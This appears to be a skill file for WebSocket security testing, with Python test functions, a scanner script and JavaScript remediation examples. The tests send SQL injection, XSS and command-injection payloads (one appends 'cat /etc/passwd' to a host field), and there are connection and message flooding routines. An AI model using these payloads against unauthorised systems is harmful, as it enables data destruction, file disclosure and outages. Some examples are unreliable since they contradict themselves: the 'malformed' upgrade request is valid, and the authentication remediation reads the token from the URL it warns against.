---
name: websocket_testing
description: WebSocket security testing including authentication, authorization, injection, and DoS attacks
---

# WebSocket Security Testing

## Overview
WebSocket connections bypass traditional HTTP security mechanisms. Testing must cover authentication, authorization, message injection, and denial-of-service attacks.

## Testing Methodology

### 1. Connection Authentication Testing

#### Unauthenticated Connection Test
```python
import asyncio
import websockets
import json

async def test_unauthenticated_connection(ws_url):
    """Test if WebSocket accepts unauthenticated connections"""
    try:
        async with websockets.connect(ws_url) as ws:
            # Try to receive messages without authentication
            try:
                message = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"Received message without auth: {message}")
                return True  # Vulnerable
            except asyncio.TimeoutError:
                return False  # Connection timed out (good)
    except Exception as e:
        print(f"Connection failed: {e}")
        return False
```

#### Token in Query String (Insecure)
```python
async def test_token_in_query(ws_url, token):
    """Test if token is passed in URL (logged in server logs)"""
    url_with_token = f"{ws_url}?token={token}"
    try:
        async with websockets.connect(url_with_token) as ws:
            return True
    except Exception:
        return False
```

### 2. Authorization Testing

#### Horizontal Privilege Escalation
```python
async def test_horizontal_escalation(ws_url, user_token, target_user_id):
    """Test if user can access other users' data"""
    headers = {"Authorization": f"Bearer {user_token}"}
    
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        # Subscribe to another user's channel
        subscribe_msg = {
            "type": "subscribe",
            "channel": f"user:{target_user_id}"
        }
        await ws.send(json.dumps(subscribe_msg))
        
        try:
            message = await asyncio.wait_for(ws.recv(), timeout=5)
            data = json.loads(message)
            if "data" in data:
                print(f"Accessed other user's data: {data}")
                return True  # Vulnerable
        except asyncio.TimeoutError:
            pass
    
    return False
```

#### Vertical Privilege Escalation
```python
async def test_vertical_escalation(ws_url, user_token):
    """Test if regular user can access admin channels"""
    headers = {"Authorization": f"Bearer {user_token}"}
    
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        # Try to subscribe to admin channel
        subscribe_msg = {
            "type": "subscribe",
            "channel": "admin:system"
        }
        await ws.send(json.dumps(subscribe_msg))
        
        try:
            message = await asyncio.wait_for(ws.recv(), timeout=5)
            data = json.loads(message)
            if "data" in data:
                print(f"Accessed admin channel: {data}")
                return True  # Vulnerable
        except asyncio.TimeoutError:
            pass
    
    return False
```

### 3. Message Injection Testing

#### SQL Injection via WebSocket
```python
async def test_sql_injection(ws_url, token):
    """Test for SQL injection in WebSocket messages"""
    headers = {"Authorization": f"Bearer {token}"}
    
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        # Send malicious search query
        search_msg = {
            "type": "search",
            "query": "'; DROP TABLE users; --"
        }
        await ws.send(json.dumps(search_msg))
        
        try:
            message = await asyncio.wait_for(ws.recv(), timeout=5)
            data = json.loads(message)
            
            # Check if error reveals SQL details
            if "error" in data and "SQL" in str(data["error"]):
                print("SQL error exposed")
                return True
        except asyncio.TimeoutError:
            pass
    
    return False
```

#### XSS via WebSocket
```python
async def test_xss_via_websocket(ws_url, token):
    """Test for XSS in WebSocket messages"""
    headers = {"Authorization": f"Bearer {token}"}
    
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        # Send message with XSS payload
        xss_msg = {
            "type": "chat",
            "message": "<script>alert('XSS')</script>"
        }
        await ws.send(json.dumps(xss_msg))
        
        # Check if payload is reflected unsanitized
        try:
            message = await asyncio.wait_for(ws.recv(), timeout=5)
            if "<script>" in message:
                print("XSS payload reflected")
                return True
        except asyncio.TimeoutError:
            pass
    
    return False
```

#### Command Injection via WebSocket
```python
async def test_command_injection(ws_url, token):
    """Test for command injection in WebSocket messages"""
    headers = {"Authorization": f"Bearer {token}"}
    
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        # Send command injection payload
        cmd_msg = {
            "type": "ping",
            "host": "127.0.0.1; cat /etc/passwd"
        }
        await ws.send(json.dumps(cmd_msg))
        
        try:
            message = await asyncio.wait_for(ws.recv(), timeout=5)
            if "root:" in message:
                print("Command injection successful")
                return True
        except asyncio.TimeoutError:
            pass
    
    return False
```

### 4. Denial of Service Testing

#### Connection Flooding
```python
async def test_connection_flood(ws_url, num_connections=1000):
    """Test if server limits concurrent connections"""
    connections = []
    
    for i in range(num_connections):
        try:
            ws = await websockets.connect(ws_url)
            connections.append(ws)
        except Exception as e:
            print(f"Failed at connection {i}: {e}")
            break
    
    print(f"Opened {len(connections)} connections")
    
    # Keep connections open
    await asyncio.sleep(10)
    
    # Close all
    for ws in connections:
        await ws.close()
    
    return len(connections) < num_connections
```

#### Message Flooding
```python
async def test_message_flood(ws_url, token, num_messages=10000):
    """Test if server limits message rate"""
    headers = {"Authorization": f"Bearer {token}"}
    
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        sent = 0
        for i in range(num_messages):
            try:
                await ws.send(json.dumps({"type": "ping", "id": i}))
                sent += 1
            except Exception:
                break
        
        print(f"Sent {sent} messages before failure")
        return sent < num_messages
```

#### Payload Size Attack
```python
async def test_payload_size(ws_url, token):
    """Test if server limits message payload size"""
    headers = {"Authorization": f"Bearer {token}"}
    
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        # Send oversized message
        large_msg = {
            "type": "data",
            "payload": "A" * (10 * 1024 * 1024)  # 10MB
        }
        
        try:
            await ws.send(json.dumps(large_msg))
            print("Oversized message accepted")
            return True
        except Exception as e:
            print(f"Oversized message rejected: {e}")
            return False
```

### 5. Protocol-Level Testing

#### Cross-Site WebSocket Hijacking (CSWSH)
```python
async def test_cswsh(ws_url, origin):
    """Test for Cross-Site WebSocket Hijacking"""
    # Simulate request from malicious origin
    headers = {"Origin": origin}
    
    try:
        async with websockets.connect(ws_url, extra_headers=headers) as ws:
            # If connection succeeds, CSRF protection is missing
            print("CSWSH vulnerability: Origin not validated")
            return True
    except Exception:
        return False
```

#### WebSocket Upgrade Header Injection
```python
def test_upgrade_header_injection(ws_url):
    """Test if server properly validates Upgrade headers"""
    import requests
    
    # Send malformed upgrade request
    headers = {
        "Upgrade": "websocket",
        "Connection": "Upgrade",
        "Sec-WebSocket-Version": "13",
        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="
    }
    
    response = requests.get(ws_url, headers=headers)
    
    # Check if server accepts malformed requests
    if response.status_code == 101:
        print("Server accepts malformed upgrade requests")
        return True
    return False
```

### 6. Data Exfiltration Testing

#### Message Logging Test
```python
async def test_message_logging(ws_url, token):
    """Test if messages are logged insecurely"""
    headers = {"Authorization": f"Bearer {token}"}
    
    async with websockets.connect(ws_url, extra_headers=headers) as ws:
        # Send sensitive data
        sensitive_msg = {
            "type": "payment",
            "card_number": "4111111111111111",
            "cvv": "123"
        }
        await ws.send(json.dumps(sensitive_msg))
        
        # Check if data appears in logs
        # (requires server access to verify)
        return True
```

### 7. Tools and Scripts

#### Comprehensive WebSocket Scanner
```python
#!/usr/bin/env python3
"""WebSocket security scanner"""
import asyncio
import websockets
import json
import sys
from typing import Dict, List, Any

class WebSocketScanner:
    def __init__(self, ws_url: str, token: str = None):
        self.ws_url = ws_url
        self.token = token
        self.findings: List[Dict[str, Any]] = []
    
    async def test_connection(self) -> bool:
        """Test basic WebSocket connection"""
        try:
            async with websockets.connect(self.ws_url) as ws:
                return True
        except Exception:
            return False
    
    async def test_authentication(self) -> bool:
        """Test if authentication is required"""
        try:
            async with websockets.connect(self.ws_url) as ws:
                # Try to send message without auth
                await ws.send(json.dumps({"type": "ping"}))
                message = await asyncio.wait_for(ws.recv(), timeout=5)
                
                self.findings.append({
                    "type": "NO_AUTHENTICATION",
                    "severity": "HIGH",
                    "description": "WebSocket accepts unauthenticated connections"
                })
                return True
        except asyncio.TimeoutError:
            return False
        except Exception:
            return False
    
    async def test_authorization(self) -> bool:
        """Test horizontal/vertical privilege escalation"""
        if not self.token:
            return False
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        try:
            async with websockets.connect(self.ws_url, extra_headers=headers) as ws:
                # Try to access admin channel
                await ws.send(json.dumps({
                    "type": "subscribe",
                    "channel": "admin:system"
                }))
                
                try:
                    message = await asyncio.wait_for(ws.recv(), timeout=5)
                    data = json.loads(message)
                    
                    if data.get("type") != "error":
                        self.findings.append({
                            "type": "VERTICAL_PRIVILEGE_ESCALATION",
                            "severity": "CRITICAL",
                            "description": "Regular user can access admin channel"
                        })
                        return True
                except asyncio.TimeoutError:
                    pass
        except Exception:
            pass
        
        return False
    
    async def test_injection(self) -> bool:
        """Test for message injection vulnerabilities"""
        if not self.token:
            return False
        
        headers = {"Authorization": f"Bearer {self.token}"}
        payloads = [
            {"type": "search", "query": "'; DROP TABLE users; --"},
            {"type": "chat", "message": "<script>alert('XSS')</script>"},
            {"type": "ping", "host": "127.0.0.1; cat /etc/passwd"}
        ]
        
        try:
            async with websockets.connect(self.ws_url, extra_headers=headers) as ws:
                for payload in payloads:
                    await ws.send(json.dumps(payload))
                    
                    try:
                        message = await asyncio.wait_for(ws.recv(), timeout=5)
                        if "SQL" in message or "root:" in message or "<script>" in message:
                            self.findings.append({
                                "type": "MESSAGE_INJECTION",
                                "severity": "CRITICAL",
                                "description": f"Possible injection via: {payload['type']}"
                            })
                            return True
                    except asyncio.TimeoutError:
                        continue
        except Exception:
            pass
        
        return False
    
    async def test_dos_resistance(self) -> bool:
        """Test denial of service resistance"""
        connections = []
        
        for i in range(100):
            try:
                ws = await websockets.connect(self.ws_url)
                connections.append(ws)
            except Exception:
                break
        
        if len(connections) >= 100:
            self.findings.append({
                "type": "NO_CONNECTION_LIMIT",
                "severity": "MEDIUM",
                "description": f"Server accepted {len(connections)} connections"
            })
        
        for ws in connections:
            await ws.close()
        
        return len(connections) >= 100
    
    async def run_all_tests(self) -> List[Dict[str, Any]]:
        """Run all WebSocket security tests"""
        print("Starting WebSocket security scan...")
        
        print("1. Testing connection...")
        if not await self.test_connection():
            print("   Cannot connect to WebSocket")
            return self.findings
        
        print("2. Testing authentication...")
        await self.test_authentication()
        
        print("3. Testing authorization...")
        await self.test_authorization()
        
        print("4. Testing injection...")
        await self.test_injection()
        
        print("5. Testing DoS resistance...")
        await self.test_dos_resistance()
        
        print(f"\nScan complete. Found {len(self.findings)} issues.")
        for finding in self.findings:
            print(f"  [{finding['severity']}] {finding['description']}")
        
        return self.findings

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python websocket_scanner.py <ws_url> [token]")
        sys.exit(1)
    
    token = sys.argv[2] if len(sys.argv) > 2 else None
    scanner = WebSocketScanner(sys.argv[1], token)
    asyncio.run(scanner.run_all_tests())
```

### 8. Remediation Guidance

#### Authentication
```javascript
// Validate token on connection
const wss = new WebSocket.Server({ noServer: true });

wss.on('connection', (ws, req) => {
    const token = new URL(req.url, 'http://localhost').searchParams.get('token');
    
    if (!validateToken(token)) {
        ws.close(1008, 'Invalid token');
        return;
    }
    
    // Don't pass token in URL - use headers or first message
});
```

#### Authorization
```javascript
// Check permissions on each message
ws.on('message', (data) => {
    const message = JSON.parse(data);
    
    if (!hasPermission(ws.userId, message.channel)) {
        ws.send(JSON.stringify({ type: 'error', message: 'Unauthorized' }));
        return;
    }
    
    // Process message
});
```

#### Rate Limiting
```javascript
// Implement rate limiting per connection
const rateLimiter = new Map();

ws.on('message', (data) => {
    const userId = ws.userId;
    const now = Date.now();
    
    if (!rateLimiter.has(userId)) {
        rateLimiter.set(userId, { count: 0, resetTime: now + 60000 });
    }
    
    const userRate = rateLimiter.get(userId);
    if (now > userRate.resetTime) {
        userRate.count = 0;
        userRate.resetTime = now + 60000;
    }
    
    userRate.count++;
    if (userRate.count > 100) { // 100 messages per minute
        ws.close(1008, 'Rate limit exceeded');
        return;
    }
});
```

#### Origin Validation
```javascript
const wss = new WebSocket.Server({
    verifyClient: (info) => {
        const origin = info.origin || info.req.headers.origin;
        const allowedOrigins = ['https://yourdomain.com'];
        
        return allowedOrigins.includes(origin);
    }
});
```

#### Payload Size Limits
```javascript
const wss = new WebSocket.Server({
    maxPayload: 1024 * 1024 // 1MB limit
});
```

## Validation Checklist

- [ ] Authentication required for all connections
- [ ] Authorization checked on every message
- [ ] Origin validation enabled
- [ ] Rate limiting implemented
- [ ] Payload size limits enforced
- [ ] Input validation on all messages
- [ ] No sensitive data in URLs
- [ ] Connection limits enforced
- [ ] Error messages don't leak internals
